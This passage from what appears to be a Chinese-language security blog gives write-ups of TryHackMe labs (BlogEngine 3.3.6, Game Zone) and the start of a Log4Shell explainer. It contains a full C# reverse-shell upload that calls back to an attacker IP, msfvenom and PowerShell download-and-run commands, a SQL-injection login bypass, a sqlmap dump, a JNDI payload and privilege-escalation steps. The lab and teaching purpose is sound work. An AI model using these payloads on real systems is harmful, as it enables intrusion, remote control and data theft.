&quot;/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=NLKCSSa7rclV2%2FJ8EyOkXyn8wneHvwl7dQJm%2F5k0xg14vnrZRR3yYw7300%2FzewSpnKP2BOnx7sIz9YoC7D3eJgxOyPHT3V1yiz8yGJY%2FGkZPGaObOQ8LHHVf5YRUG8vBeAasf8yiMd32SHbczLB0FS5RTLIz%2F7%2FNSX4%2BrBnX0AfLeE4D&amp;__EVENTVALIDATION=Y6aNHuq3ES6mIVhBQu%2Bb7pxm%2Ba%2BIhRRarD55U7J%2F3Vw%2FX0DZ%2BZ%2FRgFI9uJ0350ETBwlg3e8iJ7AUO%2BfXV8DyBt7xudkbAB4R59COT5wR1cdL4ZaS12R08VjEUwaEzsnxPAtyiRokKrfHYC4fUoFSNKpe2vuqrtu2bycn4Q6U3pS2SkZM&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=%E7%99%BB%E5%BD%95:Login failed</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[80][http-post-form] host: 10.10.186.107   login: admin   password: 1qaz2wsx</span><br></pre></td></tr></table></figure><h3 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get-shell"></a>Get-shell</h3><p>进入后台<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240525212900.png" alt="image.png"></p><p>但是 我们目前可以确定的是<br>框架版本和编号 </p><table><thead><tr><th>这是个框架</th><th>[[BlogEngine 3.3.6#远程命令执行#]]</th></tr></thead></table><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240525213513.png" alt="image.png"><br>但是msf 里面没有集成 则我们 只能自己找了<br>不过直接去ex找就可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ Control Language=<span class="string">&quot;C#&quot;</span> AutoEventWireup=<span class="string">&quot;true&quot;</span> EnableViewState=<span class="string">&quot;false&quot;</span> Inherits=<span class="string">&quot;BlogEngine.Core.Web.Controls.PostViewBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;BlogEngine.Core&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;script runat=<span class="string">&quot;server&quot;</span>&gt;</span><br><span class="line"><span class="keyword">static</span> System.IO.StreamWriter streamWriter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> override <span class="keyword">void</span> <span class="title function_">OnLoad</span><span class="params">(EventArgs e)</span> &#123;</span><br><span class="line">        base.OnLoad(e);</span><br><span class="line"></span><br><span class="line">using(System.Net.Sockets.<span class="type">TcpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.Net.Sockets.TcpClient(<span class="string">&quot;10.11.69.232&quot;</span>, <span class="number">4444</span>)) &#123;</span><br><span class="line">using(System.IO.<span class="type">Stream</span> <span class="variable">stream</span> <span class="operator">=</span> client.GetStream()) &#123;</span><br><span class="line">using(System.IO.<span class="type">StreamReader</span> <span class="variable">rdr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.IO.StreamReader(stream)) &#123;</span><br><span class="line">streamWriter = <span class="keyword">new</span> <span class="title class_">System</span>.IO.StreamWriter(stream);</span><br><span class="line"></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">strInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">System.Diagnostics.<span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.Diagnostics.Process();</span><br><span class="line">p.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">p.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">p.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">p.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">p.OutputDataReceived += <span class="keyword">new</span> <span class="title class_">System</span>.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);</span><br><span class="line">p.Start();</span><br><span class="line">p.BeginOutputReadLine();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">strInput.Append(rdr.ReadLine());</span><br><span class="line">p.StandardInput.WriteLine(strInput);</span><br><span class="line">strInput.Remove(<span class="number">0</span>, strInput.Length);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">CmdOutputDataHandler</span><span class="params">(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine)</span> &#123;</span><br><span class="line">   <span class="type">StringBuilder</span> <span class="variable">strOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!String.IsNullOrEmpty(outLine.Data)) &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">                strOutput.Append(outLine.Data);</span><br><span class="line">                    streamWriter.WriteLine(strOutput);</span><br><span class="line">                    streamWriter.Flush();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception err) &#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;asp:PlaceHolder ID=<span class="string">&quot;phContent&quot;</span> runat=<span class="string">&quot;server&quot;</span> EnableViewState=<span class="string">&quot;false&quot;</span>&gt;&lt;/asp:PlaceHolder&gt;</span><br></pre></td></tr></table></figure><p>根据exp的指示找到编辑器页面<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240525215930.png" alt="image.png"><br>之后上传  PostView.ascx<br>再访问就可以执行了<br>exp中指定了访问的目录可以看到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  -nvlp 4444 监听</span><br></pre></td></tr></table></figure><p><img src="/Pasted%20image%2020240527211403.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><table><thead><tr><th>windows机器</th><th><a href="windows%E5%B8%B8%E8%A7%84%E9%80%9A%E9%81%93.md">windows常规通道</a></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h5 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 生成exe</span></span> </span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai  LHOST=IP LPORT=PORT -f exe -o shell-name.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>***架设http服务 是的目标靶机可以获取 响应的exe 文件</p></blockquote><h6 id="运行payload"><a href="#运行payload" class="headerlink" title="运行payload"></a>运行payload</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">下载:</span><br><span class="line">powershell <span class="string">&quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://10.11.69.232/shell.exe&#x27;,&#x27;shell.exe&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">之后直接下载</span><br><span class="line">但是要保证一直在运行才能 获得持续的 shell</span><br><span class="line">运行就可以得到一个meterpreter </span><br><span class="line"></span><br><span class="line">哦对还要打开 msf 的handler 进行一个监听</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240529193624.png" alt="image.png"></p><blockquote><p>注意 这一点 监听的端口一定要设置正确  我转meterpreter 的时候监听设置成4444了跟我的<br>开始的监听冲突了</p></blockquote><h3 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h3><table><thead><tr><th>msf后渗透模块</th><th><a href="msf%E5%90%8E%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83.md">msf后渗透提权</a>提权</th></tr></thead></table><blockquote><p>是我高看了这个靶场了   很简单 直接getsystem 得到system权限 </p></blockquote><h3 id="非getsystem"><a href="#非getsystem" class="headerlink" title="非getsystem"></a>非getsystem</h3><blockquote><p>根据靶场的提示可以看到 应该是一个服务提权<br>那么我们直接就上winpeas<br>扫一下</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> upload /home/tom/get_power/windows/winPEASx86.exe /Windows/Temp/winpeas.exe</span><br><span class="line">[*] Uploading  : /home/tom/get_power/windows/winPEASx86.exe -&gt; /Windows/Temp/winpeas.exe</span><br></pre></td></tr></table></figure><blockquote><p>可以看到 服务 </p></blockquote><h4 id="rdp-原生shell"><a href="#rdp-原生shell" class="headerlink" title="rdp 原生shell"></a>rdp 原生shell</h4><blockquote><p>可以看到rdp</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thm-Gane_zone</title>
      <link href="/2024/08/17/thm-Gane-zone/"/>
      <url>/2024/08/17/thm-Gane-zone/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>靶机信息</th><th>Game Zone</th></tr></thead><tbody><tr><td>系统</td><td>linux</td></tr><tr><td>信息</td><td>前台登陆处sql注入可以直接拿到shell，之后进入隐藏服务可以拿到对应版本的webmin进行提权</td></tr><tr><td></td><td></td></tr></tbody></table><h1 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h1><h3 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 02:9D:BB:F6:4E:39 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.35 seconds</span><br><span class="line">root@ip-10-10-109-100:~</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 详细扫描80 22</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)</span><br><span class="line">|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)</span><br><span class="line">|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (EdDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Game Zone</span><br><span class="line">MAC Address: 02:9D:BB:F6:4E:39 (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.13 (99%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 5.1 (92%), Android 5.1 (92%), Linux 3.10 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.40 ms ip-10-10-101-77.eu-west-1.compute.internal (10.10.101.77)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>*总结一波 </p></blockquote><table><thead><tr><th>操作系统</th><th>Ubuntu 4ubuntu2.7</th></tr></thead><tbody><tr><td>ssh22</td><td>OpenSSH的版本为7.2p2</td></tr><tr><td>80 服务器</td><td>Apache&#x2F;2.4.18</td></tr><tr><td>语言</td><td>php</td></tr><tr><td>cookie</td><td>httponly flag not set</td></tr></tbody></table><h2 id="0x02-深入端口"><a href="#0x02-深入端口" class="headerlink" title="0x02 深入端口"></a>0x02 深入端口</h2><blockquote><p>***总觉得端口太少了 继续扫 nmap全端口扫描</p></blockquote><p>kscan 爆破一下  –hydra         自动化爆破</p><table><thead><tr><th>kscan</th><th><a href="kscan.md">kscan</a></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><blockquote><p>***没收获 直接走掉</p></blockquote><h2 id="0x03-web资产收集"><a href="#0x03-web资产收集" class="headerlink" title="0x03 web资产收集"></a>0x03 web资产收集</h2><blockquote><p>**有预感还是要 鹿web<br>利用工具打一圈</p></blockquote><h3 id="0x031-目录扫描"><a href="#0x031-目录扫描" class="headerlink" title="0x031 目录扫描"></a>0x031 目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[21:11:33] 403 -  298B  - /.ht_wsr.txt                                      </span><br><span class="line">[21:11:33] 403 -  301B  - /.htaccess.bak1                                   </span><br><span class="line">[21:11:33] 403 -  301B  - /.htaccess.save                                   </span><br><span class="line">[21:11:33] 403 -  303B  - /.htaccess.sample</span><br><span class="line">[21:11:33] 403 -  301B  - /.htaccess.orig</span><br><span class="line">[21:11:33] 403 -  302B  - /.htaccess_extra                                  </span><br><span class="line">[21:11:33] 403 -  299B  - /.htaccessBAK</span><br><span class="line">[21:11:33] 403 -  299B  - /.htaccess_sc</span><br><span class="line">[21:11:33] 403 -  301B  - /.htaccess_orig</span><br><span class="line">[21:11:33] 403 -  299B  - /.htaccessOLD</span><br><span class="line">[21:11:33] 403 -  300B  - /.htaccessOLD2</span><br><span class="line">[21:11:33] 403 -  291B  - /.htm                                             </span><br><span class="line">[21:11:33] 403 -  292B  - /.html</span><br><span class="line">[21:11:33] 403 -  301B  - /.htpasswd_test                                   </span><br><span class="line">[21:11:33] 403 -  298B  - /.httr-oauth                                      </span><br><span class="line">[21:11:33] 403 -  297B  - /.htpasswds                                       </span><br><span class="line">[21:11:37] 403 -  291B  - /.php                                             </span><br><span class="line">[21:11:37] 403 -  292B  - /.php3                                            </span><br><span class="line">[21:12:43] 301 -  313B  - /images  -&gt;  http://10.10.101.77/images/          </span><br><span class="line">[21:12:43] 200 -  868B  - /images/                                          </span><br><span class="line">[21:13:23] 403 -  301B  - /server-status/                                   </span><br><span class="line">[21:13:23] 403 -  300B  - /server-status </span><br></pre></td></tr></table></figure><blockquote><p>很奇怪 都没有权限</p></blockquote><h1 id="0x10-web-exp"><a href="#0x10-web-exp" class="headerlink" title="0x10 web_exp"></a>0x10 web_exp</h1><blockquote><p>只有一个登陆框有功能点 因此我们测试 sql 万能密码</p></blockquote><table><thead><tr><th>sql万能密码</th><th><a href="sql%E5%88%86%E7%B1%BB.md#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81">万能密码</a></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 10.10.12.101</span><br><span class="line">Content-Length: 44</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.12.101</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.12.101/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=o3940qfoad5k0trucelricpo82</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin&#x27;or 1=1-- &amp;password=&amp;x=33&amp;y=14</span><br></pre></td></tr></table></figure><blockquote><p>跳转到一个页面 主要是经营搜索的 这个功能点很可能就有一些搜索的%匹配</p></blockquote><p><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E7%AE%80%E4%BB%8B.md#H2%20%E2%80%8B%EF%BC%883%EF%BC%89%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9">H2 ​（3）搜索型注入点</a></p><blockquote><p>开始测试 searchitem&#x3D;2ad123’  因为这个东西感觉只能是字符的注入<br>因此开始测试 ‘ 发现报错</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;%&#x27;&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>***’%’’  可以看出来 就是单引号<br>那就好办 直接一把梭</p><blockquote><p>但是好久没练习了 借着这个靶场玩一下<br>目前发现可以是回显注入 </p></blockquote><p><a href="sql%E5%88%86%E7%B1%BB.md#%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5">回显注入</a></p><p>不用测了 基本没防护 除了堆注入没有感觉其他都有</p><h2 id="0x11-sqlmap"><a href="#0x11-sqlmap" class="headerlink" title="0x11 sqlmap"></a>0x11 sqlmap</h2><table><thead><tr><th>sqlmap</th><th><a href="%E5%B8%B8%E8%A7%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%BC%8F%E6%B4%9E/sqlmap.md">sqlmap</a></th></tr></thead></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r r.txt --dbms=mysql --dump </span><br></pre></td></tr></table></figure><p>*直接拖库得到 用户获得hash和用户名</p><p>串”ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14”的长度（64个字符），它看起来像是一个SHA-256哈希值 </p><p>用户:***agent47</p><blockquote><p>本来想着能不能 直接 拿到shell 因为我发现 这是一个root 用户使用的MySQL<br>但是没办法拿不到<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240608195424.png" alt="image.png"></p></blockquote><h1 id="0x20-普通权限"><a href="#0x20-普通权限" class="headerlink" title="0x20 普通权限"></a>0x20 普通权限</h1><p>先让我们的开膛手约翰叔叔 爆一下<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607164341.png" alt="image.png"></p><blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607163346.png" alt="image.png"><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607163346.png" alt="image.png"></p></blockquote><p>直接上线</p><h1 id="0x30-隐藏服务"><a href="#0x30-隐藏服务" class="headerlink" title="0x30 隐藏服务"></a>0x30 隐藏服务</h1><blockquote><p>ss -tulpn  可以看到开放了 很多端口 但是我们的namp 扫描时候只<br>开放了80 22 因此做一个端口转发 使得端口服务能够暴露出来 </p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609104300.png" alt="image.png"><br>可以看到我们的kali可以和 目标主机通信并且我们已经拿到了<br>对标agent47用户的权限我们完全可以做一个远程端口转发 使得隐藏的服务暴露出来<br>增加我们的攻击面<br>在kali上做一个转发</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 10000:localhost:10000 agent47@10.10.112.17</span><br></pre></td></tr></table></figure><p>然后进入 查看可以知道是Webmin 1.58 </p><table><thead><tr><th>远程代码执行漏洞</th><th><a href="Webmin%201.580.md">Webmin 1.580</a></th></tr></thead></table><h1 id="0X31-Get-shell"><a href="#0X31-Get-shell" class="headerlink" title="0X31  Get_shell"></a>0X31  Get_shell</h1><blockquote><p> 直接msf 搜索相对应模块 </p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609165809.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609165837.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4shell</title>
      <link href="/2024/08/17/log4shell/"/>
      <url>/2024/08/17/log4shell/</url>
      
        <content type="html"><![CDATA[<h3 id="Log4j-2-x"><a href="#Log4j-2-x" class="headerlink" title="Log4j 2.x:"></a><strong>Log4j 2.x</strong>:</h3><ul><li>Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-2021-44228），也称为 Log4Shell 漏洞。该漏洞允许攻击者通过 JNDI 查找恶意代码来远程执行代码，影响范围广泛。这个漏洞在 Log4j 2.0 到 2.14.1 版本中存在，并已在 2.15.0 及后续版本中得到修复</li></ul><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2中存在<strong>JNDI注入漏洞</strong>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码</p><h3 id="JNDI简单介绍"><a href="#JNDI简单介绍" class="headerlink" title="JNDI简单介绍"></a>JNDI简单介绍</h3><p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。<br>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240806105256.png" alt="image.png"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8a6d0c48141bbdaaceb44fe403ddb125.png"></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证:"></a>漏洞验证:</h4><p>一般来讲log4j的漏洞，是一种严重的漏洞，因为他覆盖面广，使用广泛，因此可以看到我们对于log4<br>j，一般都是在一些大型的服务器上的安装的组件的上面去验证。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h4><p>最主要还是 log4j 可以通过特定的形式例如:${}来进行一个查询替换的功能，例如我们的环境变量。因此还可以暴露敏感信息。但是他不仅可以查找变量进行替换还可以使用 ，jndi的查询服务可以查询目录和命名服务。之后就可以利用rmi或者ldap去访问我们的web服务器上的相关class文件，下载之后执行再反弹shell回到我们的攻击机器。</p><h5 id="以minecraft为例"><a href="#以minecraft为例" class="headerlink" title="以minecraft为例"></a>以minecraft为例</h5><p>Minecraft服务器是专门为Minecraft游戏设计的，它们允许玩家在Minecraft游戏中进行多人游戏和互动。这些服务器使用特定的Minecraft服务器软件来运行，这些软件是为支持Minecraft游戏而开发的。具体来说，Minecraft Java Edition使用的服务器软件称为Minecraft: Java Edition Server，而Minecraft Bedrock Edition（如手机版、Windows 10版等）使用的服务器软件称为Minecraft Bedrock Edition Server。</p><p>因此，Minecraft服务器不是通用的服务器，不能像一般的Web服务器或游戏服务器那样用于其他用途。它们专门设计用于运行Minecraft游戏，管理游戏世界、玩家互动和游戏规则。</p><p>因此我们需要一个相应版本的启动器。然后连接服务器在游戏中输入我们的payload。${jndi:ldap:ip&#x2F;a} 下载对应的web服务器上的payload从而getshell</p><h4 id="不同服务器"><a href="#不同服务器" class="headerlink" title="不同服务器"></a>不同服务器</h4><p>不同环境依赖，不同服务器对于log4j 记录接口是不一样的。因此可能触发点虽然都是${}但是我们输入的位置和接口不一样，要随机而变。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>根据vulhub 官方给出的漏洞环境进行复现。<br>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p><p>执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up 